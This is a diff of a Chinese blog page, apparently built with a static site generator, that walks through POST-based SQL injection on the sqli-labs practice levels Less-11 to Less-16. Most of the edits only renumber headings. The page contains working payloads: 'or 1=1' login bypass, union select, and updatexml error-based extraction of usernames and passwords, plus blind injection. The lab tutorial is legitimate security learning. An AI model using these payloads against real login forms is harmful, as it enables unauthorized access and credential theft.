@@ -5,10 +5,10 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="SQL注入-POST注入, 小白">
-    <meta name="description" content="0x00POST注入，就是数据从客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名
+    <meta name="description" content="[TOC]
+0x00POST注入，就是数据从客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名
 和密码以表单的形式提交， 提交到服务器后服务器再进行验证。这就是一次 post的过程。
-0x01以Less-11为例：
-当在输入框输入正">
+Less-11当在输入框输入正确的用">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -477,7 +477,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    911
+                    906
                 </div>
                 
 
@@ -502,12 +502,12 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>POST注入，就是数据从客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名</p>
+                <p>[TOC]</p>
+<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>POST注入，就是数据从客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名</p>
 <p>和密码以表单的形式提交， 提交到服务器后服务器再进行验证。这就是一次 post的过程。</p>
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>以<strong>Less-11</strong>为例：</p>
-<p>当在输入框输入正确的用户名和密码后，显示登录成功</p>
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>当在输入框输入正确的用户名和密码后，显示登录成功</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205092829849.png" alt="image-20220205092829849"></p>
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>接下来就要探测注入点：</p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>接下来就要探测注入点：</p>
 <p>当输入<code>admin&#39; --+ 123</code>,出现以下报错，可得知单引号报错；</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205101856621.png" alt="image-20220205101856621"></p>
 <p>注入以下语句：</p>
@@ -516,7 +516,7 @@
 
 <p>登录正常。</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205102713002.png" alt="image-20220205102713002"></p>
-<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>猜解字段数：</p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>猜解字段数：</p>
 <p>执行以下语句：</p>
 <pre class="line-numbers language-none"><code class="language-none">admin&#39; order by 3 #
 sss（密码随意）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -528,17 +528,16 @@ sss（密码随意）<span aria-hidden="true" class="line-numbers-rows"><span></
 
 <p>登录正常，有两个字段</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205104918157.png" alt="image-20220205104918157"></p>
-<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>判断回显点：</p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>判断回显点：</p>
 <pre class="line-numbers language-none"><code class="language-none">-admin&#39; union select 1,2#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205105159013.png" alt="image-20220205105159013"></p>
-<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>爆库名：</p>
+<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>爆库名：</p>
 <pre class="line-numbers language-none"><code class="language-none">-admin&#39; union select 1,database() #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205105334082.png" alt="image-20220205105334082"></p>
 <p>后续注入同GET方式的payload。</p>
-<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p><strong>Less-12</strong></p>
-<p>输入<code>admin&quot;</code>出现报错，基于<code>&quot;)</code>的报错</p>
+<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>输入<code>admin&quot;</code>出现报错，基于<code>&quot;)</code>的报错</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205120713625.png" alt="image-20220205120713625"></p>
 <p>同样，类似Less-11探测注入点：</p>
 <pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot;) or 1&#x3D;1 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -555,8 +554,7 @@ sss（密码随意）<span aria-hidden="true" class="line-numbers-rows"><span></
 <p>使用<code>union</code>字段一定要将开始查询的字段报错：<code>-admin&quot;)</code></p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205121257596.png" alt="image-20220205121257596"></p>
 <p>后续过程同以往payload。</p>
-<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p><strong>Less-13</strong></p>
-<p>输入<code>admin&#39;</code>出现报错，基于<code>&#39;)</code>的报错</p>
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>输入<code>admin&#39;</code>出现报错，基于<code>&#39;)</code>的报错</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205121755152.png" alt="image-20220205121755152"></p>
 <p>探测注入点：</p>
 <pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;) or 1&#x3D;1#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -586,8 +584,7 @@ sss（密码随意）<span aria-hidden="true" class="line-numbers-rows"><span></
 <pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e),1)#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这里还可以使用其他的盲注进行测试。其他的payload见Less-5。</p>
-<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p><strong>Less-14</strong></p>
-<p>输入<code>admin&quot;</code>,报错，对id进行了<code>&quot;</code>处理</p>
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>输入<code>admin&quot;</code>,报错，对id进行了<code>&quot;</code>处理</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205123906183.png" alt="image-20220205123906183"></p>
 <p>探测注入点：</p>
 <pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&quot; or 1&#x3D;1 #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -604,7 +601,7 @@ sss（密码随意）<span aria-hidden="true" class="line-numbers-rows"><span></
 <p>时间盲注，猜测版本号，等待响应，版本号不大于6</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205125050833.png" alt="image-20220205125050833"></p>
 <p>其他payload同以往。</p>
-<h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><p><strong>Less-15</strong></p>
+<p>##Less-15</p>
 <p>输入<code>admin&#39;</code>登录失败 ，输入<code>admin&#39; or 1=1#</code>登录成功，但都无回显，无报错，结合源代码，这里对于id进行了<code>&#39;</code>处理，试验报错盲注，发现没有任何变化 ，而且还是登录失败的界面：</p>
 <pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&#39; or updatexml(1,concat(0x7e,select database(),0x7e),1)   #&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -619,8 +616,7 @@ sss（密码随意）<span aria-hidden="true" class="line-numbers-rows"><span></
 <p>布尔盲注探测数据库第一位字符，回显登录正确。</p>
 <p><img src="/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/image-20220205131312857.png" alt="image-20220205131312857"></p>
 <p>其他payload见以往。</p>
-<h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><p><strong>Less-16</strong></p>
-<p>根据源码，这里对id进行了<code>&quot;)</code>的处理，其他payload与Less-15相同。</p>
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>根据源码，这里对id进行了<code>&quot;)</code>的处理，其他payload与Less-15相同。</p>
 
                 
             </div>
@@ -1058,7 +1054,7 @@ sss（密码随意）<span aria-hidden="true" class="line-numbers-rows"><span></
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">34.5k</span>
+                        class="white-color">34.7k</span>
             
             
             
